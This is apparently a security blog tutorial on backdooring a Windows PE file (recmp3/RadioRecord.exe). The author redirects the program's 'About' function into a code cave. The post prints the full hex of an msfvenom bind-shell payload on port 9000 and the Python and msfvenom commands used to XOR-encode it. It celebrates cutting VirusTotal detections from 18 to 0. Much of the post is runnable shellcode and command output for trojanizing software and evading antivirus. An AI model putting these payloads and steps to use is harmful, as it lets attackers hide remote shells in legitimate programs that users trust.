---
title: Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II)
author: fwinsnes
date: 2020-10-21 13:44:00 +0800
categories: [Backdooring]
tags: [assembly, shellcoding]
---


### Introduction

You find yourself reading the second volume of the "PE File Backdooring" series. As a result of such, I highly recommend reading the first [one](https://whitecr0wz.github.io/posts/Backdooring-PE/), as it may help understanding the shown material on this post.

Today, I will be explaining how to backdoor PE Files with the addition of user interaction and encoding as well. Furthermore, in order to replay the concept, the application [recmp3](https://sourceforge.net/projects/recmp3/) will be used, as it is a lightweight program which has several Code Caves with ASLR disabled within the affected zone. 

![](/assets/img/Code_Cave_II/1.png)
###### recmp3 when executed.

Let's check the available Code Caves.

```term
C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32>python.exe pycave.py -
f "C:\Users\IEUser\Desktop2\RadioRecord\RadioRecord.exe"
[+] Minimum code cave size: 300
[+] Image Base:  0x00400000
[+] Loading "C:\Users\IEUser\Desktop2\RadioRecord\RadioRecord.exe"...

[+] Looking for code caves...
[+] Code cave found in .data            Size: 559 bytes         RA: 0x000A3E79
VA: 0x004A3E79
[+] Code cave found in .data            Size: 8195 bytes        RA: 0x000A41FD
VA: 0x004A41FD
[+] Code cave found in .rsrc            Size: 513 bytes         RA: 0x000A94AF
VA: 0x004C24AF
[+] Code cave found in .rsrc            Size: 513 bytes         RA: 0x000A9A27
VA: 0x004C2A27

C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32>
```

0x004A41FD seems rather juicy, with more than 5000+ bytes! This code cave seems rather interesting.

##### When the fun begins.

As we desire to make the PE File execute shellcode when interacted with in a certain manner, it is required to discover a place to intervene with the flow. For example, if we 
check the option "About", the program displays the following. 

![](/assets/img/Code_Cave_II/2.png)

As it is seen, this allows us to gather information of the program and its author. We can use this function to our advantage. Let's investigate this function in Immunity.

In order to find such, the option "Search For > All referenced text strings" will be used. This will search for all text strings that are somehow being used or pushed into the 
stack.

![](/assets/img/Code_Cave_II/3.png)

It is gone to the top in order to search for a key phrase, such as for example, "sourceforge".

![](/assets/img/Code_Cave_II/4.png)

![](/assets/img/Code_Cave_II/5.png)

![](/assets/img/Code_Cave_II/6.png)

Immunity seems to have given us the desired result. Similarly to the previous blog post, the following step is to replace a specific address that is being executed when the 
function is processed with a JMP instruction pointing to our code cave. In addition with this, when we finish with our shellcode and aligning the stack, the overwriten address 
is executed once again and a JMP instruction is placed pointing to the original flow.

In this case, I will replace the PUSH instruction that gives us the information. Moreover, the instructions will be saved so that they are re-assigned later on.

![](/assets/img/Code_Cave_II/7.png)

The next step; assembling a JMP address to our code cave at 0x004A41FD, at the same time overwriting the address at 0x00403426.

![](/assets/img/Code_Cave_II/8.png)

Good, this is then saved as in the previous post through "Copy to Executable" into a new file. 
Furthermore, if we now make use of the option "About" once again, the flow will be redirected to the code cave.

![](/assets/img/Code_Cave_II/9.gif)

Now, in contemplation of jumping to the code cave without any difficulty,the bytes prior and after 0x004A41FD will be replaced by NOPs.

![](/assets/img/Code_Cave_II/10.png)

![](/assets/img/Code_Cave_II/11.png)

Similarly to VOL:I of the series, the order of our payload is the following:

+ PUSHAD/PUSHFD instructions. These will save our registers/flags so that they are aligned later on. It is essential for the registers/flags to be aligned so that the 
instructions work perfectly according to the value of these.
+ The Shellcode. Shellcode, we are used to it. Some modifications may need to be issued, such as the removal of the last instruction in some cases, as it tends to crash the flow 
and the modification of a byte which waits for the shellcode to exit for the main program to return its original flow.
+ Alignment. The ESP Register must be restored to its old value.
+ POPFD/POPAD. These instructions will restore our registers/flags.
+ As when assembling the JMP on the entry point instruction some other instructions were replaced, these must be assembled once again so that the code runs as intended and does 
not crash!
+ A JMP instruction pointing towards the following instruction after the replaced ones within the original function. In this case, it will be 0x0040342B.

Remembering this order, the PUSHAD/PUSHFD instructions are assembled.

![](/assets/img/Code_Cave_II/12.png)

The payload used will be the same as the previous, a unstaged bind shell that will display at port 9000.

Generating the payload.

```term
root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 328 bytes
Final size of hex file: 656 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f
6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd
4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545
056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
root@whitecr0wz:~# 
```

The shellcode is pasted with "Binary paste".

![](/assets/img/Code_Cave_II/13.png)

![](/assets/img/Code_Cave_II/14.png)

DEC ESI is replaced for a NOP, this is done so that it allows the execution to continue after the shell is established.

![](/assets/img/Code_Cave_II/15.png)

![](/assets/img/Code_Cave_II/16.png)

The final CALL EBP is removed as it would completely demolish the flow. Instead, the stack alignment is placed, which is the same that in the aforementioned post, as the payload 
is exactly the same.

![](/assets/img/Code_Cave_II/17.png)

The stack alignment is placed.

![](/assets/img/Code_Cave_II/18.png)

The POPAD/POPFD instructions are placed.

![](/assets/img/Code_Cave_II/19.png)

The PUSH address is re-assigned.

![](/assets/img/Code_Cave_II/20.png)

The JMP address pointing to 0x0040342B is assembled.

![](/assets/img/Code_Cave_II/21.png)

#### EndGame #1

![](/assets/img/Code_Cave_II/22.gif)

VirusTotal results:

![](/assets/img/Code_Cave_II/23.png)

Although there is big room for improvement, 26 from VOL:I to 18 is a great enhancement.

### Encoding

However, things are far from over, as I will not stop to a result of 18, therefore, I thought of a simple method for encoding the entire payload. This consists in copying the 
entire chunk of instructions (including the PUSHAD/PUSHFD) and encode them with msfvenom. In addition, these are later on assembled once again encoded.

The steps would be the following:

+ Copying the entire set of instructions with "Binary Copy".
+ Convert the fromat into hex escape sequences
+ Encode the payload with msfvenom with an encoder such as x86/xor_dynamic, x86/shikata_ga_nai, x86/alpha_mixed, and so forth.
+ Paste the entire set of instructions once again with "Binary Paste".
+ As encoding will definitely increment the length of the instructions, the final JMP instruction back to the original flow may be seemed altered to an undesired address; 
therefore, the encoded payload must be decoded, and the JMP must be assembled once again to the desired address, giving a different opcode that will make us encode the payload 
once again with the correct values.

This sounds way harder than it actually is, let's do it!

Copying the entire payload with "Binary Copy".

![](/assets/img/Code_Cave_II/24.png)

This will copy the instructions to our clipboard in a hex format, similar to msfvenom when providing a payload. However, this is not the one that we need, reason why I used 
[defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly2), that will turn the hex format into the escape sequences as desired for you, just paste them on the 
"Disassemble" section and process them. You can also perform this task manually, but it may take you a very long time.

Raw payload:

```term
60 9C FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 8B 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF
AC 3C 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F2 52 57 8B 52 10 8B 4A 3C 8B 4C 11 78 E3 48 01 D1 51 8B
59 20 01 D3 8B 49 18 E3 3A 49 8B 34 8B 01 D6 31 FF AC C1 CF 0D 01 C7 38 E0 75 F6 03 7D F8 3B 7D
24 75 E4 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 D3 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A
51 FF E0 5F 5F 5A 8B 12 EB 8D 5D 68 33 32 00 00 68 77 73 32 5F 54 68 4C 77 26 07 FF D5 B8 90 01
00 00 29 C4 54 50 68 29 80 6B 00 FF D5 6A 08 59 50 E2 FD 40 50 40 50 68 EA 0F DF E0 FF D5 97 68
02 00 23 28 89 E6 6A 10 56 57 68 C2 DB 37 67 FF D5 57 68 B7 E9 38 FF FF D5 57 68 74 EC 3B E1 FF
D5 57 97 68 75 6E 4D 61 FF D5 68 63 6D 64 00 89 E3 57 57 57 31 F6 6A 12 59 56 E2 FD 66 C7 44 24
3C 01 01 8D 44 24 10 C6 00 44 54 50 56 56 56 46 56 4E 56 56 53 56 68 79 CC 3F 86 FF D5 89 E0 90
56 46 FF 30 68 08 87 1D 60 FF D5 BB F0 B5 A2 56 68 A6 95 BD 9D FF D5 3C 06 7C 0A 80 FB E0 75 05
BB 47 13 72 6F 6A 00 53 81 C4 00 02 00 00 9D 61 68 B8 7F 49 00 E9 BA F0 F5 FF
```

Payload within escape sequence format:

```term
"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\xBA\xF0\xF5\xFF"
```

In order to encode the payload, the STDIN function from msfvenom shall be used. So as to achievethis result, a python script will be employed, that may contain a variable with 
the payload, so that it is then printed into the command-line. Moreover, msfvenom will analyze such data and encode it.

Python script:

```term
root@whitecr0wz:~# cat custom.py 

shellcode = (

"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\xBA\xF0\xF5\xFF"

)

print (shellcode)
root@whitecr0wz:~# 
```

In this case, I chose the encoder x86/xor_dynamic, as it is very effective, and it is not very well known.

```term
root@whitecr0wz:~# python custom.py | msfvenom -p - --platform windows -a x86 -e x86/xor_dynamic -n 5 -f hex 
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/xor_dynamic
x86/xor_dynamic succeeded with size 393 (iteration=0)
x86/xor_dynamic chosen with final size 393
Successfully added NOP sled of size 5 from x86/single_byte
Payload size: 398 bytes
Final size of hex file: 796 bytes
27f52ff83feb235b89dfb06ffcae75fd89f989de8a0630074766813f0641740846803e6f75eeebeaffe1e8d8ffffff276f47bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e
6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d
76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f
2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f
81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ce9dd7d2d82d0641
root@whitecr0wz:~# 
```

As seen, the payload has grown in terms of size, this will make the last JMP useless, we will take care of it later on.

The entire chain of characters is removed with "Fill with 00".

![](/assets/img/Code_Cave_II/25.png)

The encoded payload is pasted with "Binary paste".

![](/assets/img/Code_Cave_II/26.png)

When the function is not loaded, the shellcode remains encoded. Nevertheless, when interacted with, it will decode itself. As it is required to modify the last instruction, it 
will be interacted with.

Last section of the payload before decoding.

![](/assets/img/Code_Cave_II/27.png)

After decoding.

![](/assets/img/Code_Cave_II/28.png)

Interesting, our JMP no longer points to 0040342B. Instead, it directs the flow to 0040345C. With this configuration, our backdoor will never work properly! Let's make some 
modifications.

![](/assets/img/Code_Cave_II/29.png)

As seen on the image, the second opcode of the JMP, BA, has been replaced for 89, meaning that this is the byte that should be replaced in our custom.py.

Python script (the only arranged change is at the five last hex characters):

```term
root@whitecr0wz:~# cat custom.py 

shellcode = (

"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\x89\xF0\xF5\xFF"

)

print (shellcode)
root@whitecr0wz:~# 
```

Generating the payload once again:

```term
root@whitecr0wz:~# python custom.py | msfvenom -p - --platform windows -a x86 -e x86/xor_dynamic -n 5 -f hex 
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/xor_dynamic
x86/xor_dynamic succeeded with size 393 (iteration=0)
x86/xor_dynamic chosen with final size 393
Successfully added NOP sled of size 5 from x86/single_byte
Payload size: 398 bytes
Final size of hex file: 796 bytes
f5982f933feb235b89dfb052fcae75fd89f989de8a0630074766813f723c740846803e5275eeebeaffe1e8d8ffffff275247bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e
6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d
76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f
2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f
81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ceaed7d2d82d723c
root@whitecr0wz:~# 
```

Let's repeat the previous process and save.

![](/assets/img/Code_Cave_II/30.png)

#### EndGame #2

![](/assets/img/Code_Cave_II/31.gif)

VirusTotal results:

![](/assets/img/Code_Cave_II/result.png)

From 18 to 0! This is beyond impressive! Thank you for reading this blog post! 

### References

Capt. Meelo’s post: [https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html](https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html)

Online x86/x64 Assembler/Disassembler: [https://defuse.ca/online-x86-assembler.htm#disassembly2](https://defuse.ca/online-x86-assembler.htm#disassembly2)
